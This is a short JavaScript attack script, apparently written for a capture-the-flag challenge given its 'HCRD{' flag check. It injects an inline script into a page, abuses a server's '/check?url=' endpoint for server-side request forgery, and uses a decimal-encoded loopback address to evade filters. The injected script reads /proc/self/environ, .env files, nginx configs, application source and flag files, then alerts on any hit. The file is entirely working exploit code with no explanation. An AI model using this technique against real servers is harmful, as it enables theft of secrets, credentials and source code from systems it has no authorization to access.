// g.js - Crear script inline en el contexto de la pagina
var s = document.createElement('script');
s.textContent = `
(function() {
  function ssrf(path, cb) {
    var x = new XMLHttpRequest();
    x.open('GET', '/check?url=' + encodeURIComponent('http://2130706433' + path), true);
    x.onload = function() { cb(x.responseText); };
    x.onerror = function() { cb('ERROR'); };
    x.send();
  }

  function parse(xml) {
    var m = xml.match(/<body>([\\s\\S]*?)<\\/body>/);
    if (!m) return xml;
    return m[1]
      .replace(/&amp;/g,'&').replace(/&lt;/g,'<')
      .replace(/&gt;/g,'>').replace(/&apos;/g,"'")
      .replace(/&quot;/g,'"');
  }

  var paths = [
    '/flag.txt','/flag','/proc/self/environ',
    '/proc/self/cmdline','/etc/nginx/nginx.conf',
    '/etc/nginx/conf.d/default.conf',
    '/app/app.py','/app/main.py','/app/server.py',
    '/app/.env','/.env','/app/flag.txt',
    '/tmp/flag.txt','/root/flag.txt',
  ];

  paths.forEach(function(path) {
    ssrf(path, function(raw) {
      var body = parse(raw);
      if (body.includes('HCRD{')) {
        alert('FLAG: ' + body);
      } else if (
        !body.includes('refused') &&
        !body.includes('not allowed') &&
        !body.includes('404') &&
        !body.includes('403') &&
        !body.includes('ERROR') &&
        body.length > 20
      ) {
        alert('HIT [' + path + ']:\\n' + body.substring(0,1000));
      }
    });
  });
})();
`;
document.head.appendChild(s);